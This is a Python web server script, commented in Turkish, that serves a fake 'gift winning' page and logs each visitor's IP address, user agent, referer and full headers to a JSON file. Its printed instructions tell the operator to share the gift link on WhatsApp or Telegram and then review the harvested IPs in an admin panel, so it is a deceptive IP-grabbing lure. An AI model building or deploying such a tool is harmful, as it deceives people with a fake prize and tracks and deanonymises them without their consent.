#!/usr/bin/env python3
import http.server
import socketserver
import socket
import webbrowser
import os
import sys
import json
import urllib.parse
from datetime import datetime

# Port numarası
PORT = 8080

class MyHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def end_headers(self):
        # CORS başlıkları ekle (farklı cihazlardan erişim için)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        super().end_headers()

    def do_GET(self):
        # Ana sayfa için yönlendirme
        if self.path == '/':
            self.path = '/hediye_kazanma.html'

        # IP logging için özel endpoint
        if self.path.startswith('/log_ip'):
            self.log_visitor_ip()
            return

        super().do_GET()

    def do_POST(self):
        # POST istekleri için IP logging
        if self.path == '/log_ip':
            self.log_visitor_ip()
            return
        super().do_POST()

    def log_visitor_ip(self):
        """Ziyaretçi IP'sini kaydet"""
        try:
            # IP adresini al
            client_ip = self.get_client_ip()

            # User agent ve diğer bilgileri al
            user_agent = self.headers.get('User-Agent', 'Bilinmiyor')
            referer = self.headers.get('Referer', 'Direkt erişim')

            # Ziyaretçi bilgilerini oluştur
            visitor_info = {
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'ip': client_ip,
                'user_agent': user_agent,
                'referer': referer,
                'headers': dict(self.headers)
            }

            # Dosyaya kaydet
            self.save_visitor_log(visitor_info)

            # Başarılı yanıt gönder
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()

            response = json.dumps({
                'status': 'success',
                'ip': client_ip,
                'timestamp': visitor_info['timestamp']
            })
            self.wfile.write(response.encode())

        except Exception as e:
            print(f"❌ IP logging hatası: {e}")
            self.send_response(500)
            self.end_headers()

    def get_client_ip(self):
        """Gerçek client IP'sini al"""
        # Proxy başlıklarını kontrol et
        forwarded_for = self.headers.get('X-Forwarded-For')
        if forwarded_for:
            return forwarded_for.split(',')[0].strip()

        real_ip = self.headers.get('X-Real-IP')
        if real_ip:
            return real_ip

        # Direkt bağlantı IP'si
        return self.client_address[0]

    def save_visitor_log(self, visitor_info):
        """Ziyaretçi bilgilerini dosyaya kaydet"""
        log_file = 'visitor_logs.json'

        # Mevcut logları oku
        logs = []
        if os.path.exists(log_file):
            try:
                with open(log_file, 'r', encoding='utf-8') as f:
                    logs = json.load(f)
            except:
                logs = []

        # Yeni log ekle
        logs.append(visitor_info)

        # Dosyaya kaydet
        with open(log_file, 'w', encoding='utf-8') as f:
            json.dump(logs, f, ensure_ascii=False, indent=2)

        print(f"📝 Yeni ziyaretçi kaydedildi: {visitor_info['ip']} - {visitor_info['timestamp']}")

def get_local_ip():
    """Yerel IP adresini al"""
    try:
        # İnternet bağlantısı üzerinden IP al
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "localhost"

def get_wifi_ip():
    """WiFi IP adresini al"""
    try:
        hostname = socket.gethostname()
        return socket.gethostbyname(hostname)
    except:
        return get_local_ip()

def main():
    # Çalışma dizinini ayarla
    os.chdir(os.path.dirname(os.path.abspath(__file__)))

    # Server'ı başlat
    with socketserver.TCPServer(("", PORT), MyHTTPRequestHandler) as httpd:
        local_ip = get_local_ip()
        wifi_ip = get_wifi_ip()

        print("=" * 70)
        print("🎁 HEDİYE KAZANMA SİSTEMİ - WEB SERVER")
        print("=" * 70)
        print(f"🌐 Ana IP: http://{local_ip}:{PORT}")
        print(f"📶 WiFi IP: http://{wifi_ip}:{PORT}")
        print(f"💻 Local: http://localhost:{PORT}")
        print("=" * 70)
        print("🔗 PAYLAŞIM LİNKLERİ:")
        print(f"🎁 Hediye Link: http://{local_ip}:{PORT}/hediye_kazanma.html")
        print(f"📊 Admin Panel: http://{local_ip}:{PORT}/istatistikler.html")
        print("=" * 70)
        print("📱 TELEFON İÇİN:")
        print(f"   http://{wifi_ip}:{PORT}/hediye_kazanma.html")
        print("=" * 70)
        print("📋 KULLANIM:")
        print("1. Yukarıdaki 'Hediye Link'i kopyala")
        print("2. WhatsApp/Telegram'da paylaş")
        print("3. Admin Panel ile IP'leri kontrol et")
        print("4. Durdurmak için Ctrl+C bas")
        print("=" * 70)

        try:
            # Admin panelini tarayıcıda aç
            webbrowser.open(f'http://localhost:{PORT}/istatistikler.html')

            print("✅ Server çalışıyor... (Durdurmak için Ctrl+C)")
            print("📝 Ziyaretçi logları 'visitor_logs.json' dosyasına kaydediliyor")
            print()

            httpd.serve_forever()

        except KeyboardInterrupt:
            print("\n🛑 Server durduruldu.")
            print("📄 Loglar 'visitor_logs.json' dosyasında saklandı.")
            sys.exit(0)

if __name__ == "__main__":
    main()
